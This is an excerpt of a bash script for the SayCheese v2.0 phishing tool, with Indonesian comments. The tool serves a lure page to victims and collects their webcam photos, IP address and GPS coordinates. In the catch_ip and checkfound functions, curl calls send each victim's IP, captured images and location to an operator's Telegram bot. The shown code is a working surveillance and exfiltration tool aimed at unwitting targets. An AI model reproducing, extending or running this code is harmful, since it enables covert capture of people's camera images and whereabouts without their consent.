...
# SayCheese v2.0
# Maintained by: github.com/azix25)
# Github: https://github.com/azix25/saycheese
#!/bin/bash
trap 'printf "\n";stop' 2
version=$(cat version)
banner() {
    ...
    printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]      github.com/azix25/saycheese (forked and active Repository)           \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
    printf "\n"
...
dependencies() {
    command -v php >/dev/null 2>&1 || {
        echo -e >&2 "I require php but it's not installed. Install it (https://php.net)"
        exit 1
    }
}
...
catch_ip() {
    ...
    # Kirim IP Target ke Telegram
    curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
        -d "chat_id=${CHAT_ID}" \
        -d "text=Target IP: ${ip}" > /dev/null
}
...
checkfound() {
    ...
    while true; do
        ...
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Cam file received!\e[0m\e[1;77m (saved in images/)\e[0m\n"
            rm -rf Log.log
            
            # Mengambil file gambar terbaru yang masuk ke folder images/
            ...
            if [ -f "$LATEST_IMAGE" ]; then
                ...
                curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendPhoto" \
                    ...
                    -F "caption= Foto target berhasil didapatkan!" > /dev/null
            
        fi
     fi        
        if [ -f "lokasi_target.txt" ]; then
            printf "\n\e[1;32m[+]\e[0m Lokasi GPS berhasil diterima!\e[0m\n"
            cat lokasi_target.txt
            
            # Membaca data koordinat dari file
            DATA_GPS=$(cat lokasi_target.txt)
            LATITUDE=$(echo "$DATA_GPS" | awk -F',' '{print $1}' | tr -d '[:space:]')
            LONGITUDE=$(echo "$DATA_GPS" | awk -F',' '{print $2}' | tr -d '[:space:]')
            
            # Kirim teks koordinat mentah
            curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
                -d "chat_id=${CHAT_ID}" \
                -d "text=Koordinat Target: ${DATA_GPS}" > /dev/null
                
            # Kirim peta interaktif jika koordinat valid berupa angka
            if [[ "$LATITUDE" =~ ^[0-9.-]+$ ]] && [[ "$LONGITUDE" =~ ^[0-9.-]+$ ]]; then
                curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendLocation" \
                    -d "chat_id=${CHAT_ID}" \
                    -d "latitude=${LATITUDE}" \
                    -d "longitude=${LONGITUDE}" > /dev/null
            fi
            
            rm -rf lokasi_target.txt
        fi
...
ngrok_server() {
    if [[ ! -e ngrok ]]; then
        command -v unzip >/dev/null 2>&1 || {
            echo -e >&2 "I require unzip but it's not installed. Install it (http://sourceforge.net)"
            exit 1
        }
    fi
}
